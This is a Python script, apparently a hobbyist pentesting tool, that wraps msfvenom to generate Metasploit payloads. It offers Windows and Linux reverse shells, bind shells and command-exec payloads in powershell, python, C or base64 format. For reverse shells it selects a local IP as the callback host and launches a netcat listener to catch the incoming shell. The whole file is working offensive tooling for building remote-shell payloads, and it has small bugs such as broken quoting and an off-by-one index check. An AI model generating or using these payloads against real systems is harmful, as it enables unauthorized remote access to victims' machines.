import os

# ### -st shell type 
# ### -lp reversePort 
# ### -rp remote port 
# ### -rh Remote Host  
# ### -f output format

interfaces="ifconfig | grep \"netmask\" | sed 's/   //g' | cut -d " " -f 4"
interfaces="ifconfig | grep netmask | cut -d \" \" -f 2"
interfaces="ifconfig | grep \"netmask\" | sed 's/   //g' | cut -d \" \" -f 4 "
payloadFormat = ("powershell" , "python" , "c" , "base64")
payloadsLinux = ("linux/x86/shell_bind_tcp" ,"linux/x64/shell_bind_tcp", "linux/x86/shell_reverse_tcp " ,"linux/x64/shell_reverse_tcp", "linux/x64/exec" , "linux/x86/exec")
payloadsWindows = ("windows/x64/shell_bind_tcp", "windows/shell_bind_tcp", "windows/exec", "windows/x64/shell_reverse_tcp", "windows/shell_reverse_tcp")
def banner():                                                                                   
    print("@@@@@@@  @@@  @@@ @@@ @@@ @@@       @@@@@@   @@@@@@  @@@@@@@  @@@@@@@@ @@@@@@@  ")
    print("@@!  @@@ @@@  @@@ @@! !@@ @@!      @@!  @@@ @@!  @@@ @@!  @@@ @@!      @@!  @@@ ")
    print("@!@@!@!  @!@!@!@!  !@!@!  @!!      @!@  !@! @!@!@!@! @!@  !@! @!!!:!   @!@!!@!  ")
    print("!!:           !!!   !!:   !!:      !!:  !!! !!:  !!! !!:  !!! !!:      !!: :!!  ")
    print(" :            : :   .:    : ::.: :  : : ::   :   : : :: :  :  : :: ::   :   : : ")
    print("\nby Super0zi.\n\n\n")

def main():
    controler = True
    shell_type = ""
    victem_port = "" 
    local_port = "" 
    local_ip = "" 
    Selected_payload_Format = ""
    cmd=("/bin/bash","cmd.exe")
    Command = ""
    
    banner()

    print("[+] Select Shell Type ....")
    for item in range(len(payloadsWindows)):
        print(f"[{item}] {payloadsWindows[item]}")
    for item in range (len(payloadsLinux)):
        print(f"[{(item) + len(payloadsWindows)}] {payloadsLinux[item]}")
    shell_type = input()

    if int(shell_type) > len(payloadsWindows):
        shell_type = payloadsLinux[int(shell_type) - len(payloadsWindows)]
    else:
        shell_type = payloadsWindows[int(shell_type)]
    
    print("")
    if "reverse" in shell_type or "bind" in shell_type:
        print("[+] Enter Victim Port ....")
        victem_port = input()
        print("")
        if "reverse" in shell_type:
            print("[+] Enter Local Listening Port ....")
            local_port= input()


    ipList = os.popen(interfaces).read()
    ipList = ipList.split("\n")
    print("")
    if "reverse" in shell_type:
        print("[+] Select Which IP You Want To Use ....")
        for item in range (len(ipList) - 1 ):
            print( f"[{item}] {ipList[item]}")
        local_ip = input()
        local_ip = ipList[int(local_ip)]
        print("")

    print("[+] Select Payload Format ....")
    for item in range(len(payloadFormat)):
        print(f"[{item}] {payloadFormat[item]}")
    Selected_payload_Format = input()
    Selected_payload_Format = payloadFormat[int(Selected_payload_Format)]

    ## Entered Values ###
    print("\n\n I will Execute The Following Command: \n")
    if "reverse" in shell_type:
        #Reverse_payload = os.popen("msfvenom -f {Selected_payload_Format} -p {shell_type} LPORT={local_port} LHOST={local_ip}").read()
        print(f"msfvenom -f {Selected_payload_Format} -p {shell_type} LPORT={local_port} LHOST={local_ip}")
        Command = f"msfvenom -f {Selected_payload_Format} -p {shell_type} LPORT={local_port} LHOST={local_ip}"
    elif "bind" in shell_type:
        #Bind_payload = os.popen("msfvenom -f {Selected_payload_Format} -p {shell_type} RPORT={victem_port}").read() 
        print(f"msfvenom -f {Selected_payload_Format} -p {shell_type} RPORT={victem_port}")
        Command = f"msfvenom -f {Selected_payload_Format} -p {shell_type} RPORT={victem_port}"
    elif "exec" in shell_type:
        #Exec_payload = os.popen("msfvenom -f {Selected_payload_Format} -p {shell_type} ").read() 
        if "linux" in shell_type:
            cmd = cmd[0]
        else:
            cmd = cmd[1]
        print(f"msfvenom -f {Selected_payload_Format} -p {shell_type} CMD=\"{cmd}\" ")
        Command = f"msfvenom -f {Selected_payload_Format} -p {shell_type} CMD=\"{cmd}\" "
    else:
        print("Unknown")
    result = os.popen(Command).read()
    print(result)
    if "reverse" in shell_type:
        os.system(f"nc -nvlp {local_port}")
main()